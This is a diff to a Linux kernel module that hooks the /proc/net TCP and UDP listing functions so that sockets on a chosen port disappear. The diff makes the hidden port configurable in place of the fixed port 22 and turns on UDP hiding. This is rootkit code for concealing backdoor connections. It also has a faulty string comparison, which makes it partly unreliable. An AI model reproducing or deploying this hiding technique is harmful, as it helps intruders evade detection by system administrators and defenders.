@@ -78,7 +78,7 @@ static int manipulated_tcp_show(struct seq_file* m, void *v)
 	inet = inet_sk(sk);
 	port = ntohs(inet->inet_sport);
 	
-	if(port == 22)
+	if(port == port_number && tlp_version == "tcp")
 	{
 		return 0;
 	}
@@ -101,7 +101,7 @@ static int manipulated_udp_show(struct seq_file* m, void *v)
         inet = inet_sk(sk);
         port = ntohs(inet->inet_sport);
         
-        if(port == port_number)
+        if(port == port_number)// && tlp_version == "udp")
 	{
                 return 0;
 	}
@@ -232,7 +232,7 @@ static int __init hidemodule_init(void)
     	struct udp_seq_afinfo *udp_seq = 0;
 	int count = 0;
 	
-	while(proc && count<1)
+	while(proc && count<2)
 	{	
 		if(strcmp(proc->name, "tcp") == 0)
 		{	
@@ -241,16 +241,13 @@ static int __init hidemodule_init(void)
 			tcp_seq->seq_ops.show = manipulated_tcp_show;
 			count++;
 		}
-	//todo : hiding for udp: insmod crashing
-/*		if(strcmp(proc->name, "udp") == 0)
+		if(strcmp(proc->name, "udp") == 0)
 		{
-			printk("hooked udp\n");
 			udp_seq = proc->data;
 			original_udp_show = udp_seq->seq_ops.show;
-			tcp_seq->seq_ops.show = manipulated_udp_show;
+			udp_seq->seq_ops.show = manipulated_udp_show;
 			count++;
-		} */
-		//todo: write for udp also: done
+		} 
 		proc = proc->next;
 	}
 
@@ -286,7 +283,7 @@ static void __exit hidemodule_exit(void)
     	struct udp_seq_afinfo *udp_seq = 0;
 	int count = 0;
 	
-	while(proc && count<1)
+	while(proc && count<2)
 	{
 		if (strcmp(proc->name, "tcp") == 0)
 		{
@@ -294,12 +291,12 @@ static void __exit hidemodule_exit(void)
 	                tcp_seq->seq_ops.show = original_tcp_show;
             		count++;
         	}
-		/*if(strcmp(proc->name, "udp") == 0)
+		if(strcmp(proc->name, "udp") == 0)
 		{
 			udp_seq = proc->data;
 			udp_seq->seq_ops.show = original_udp_show;
 			count++;
-		}*/
+		}
 	
 		proc = proc->next;
 	}
